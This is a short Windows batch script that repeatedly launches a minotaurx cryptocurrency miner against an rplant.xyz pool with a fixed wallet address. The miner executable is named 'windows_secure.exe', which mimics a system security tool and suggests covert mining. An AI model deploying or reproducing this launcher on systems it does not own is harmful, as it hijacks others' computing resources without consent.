rem
rem Choose nearest stratum:
rem       stratum-ru.rplant.xyz   /Moscow/
rem       stratum-eu.rplant.xyz   /London/
rem       stratum-asia.rplant.xyz /Singapore/
rem       stratum-na.rplant.xyz   /Toronto/
rem
:start
"%~dp0"windows_secure.exe -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RVUPsgdt4Zsi29WanhW3KxryieaiKVv11B.test -t 1
goto start
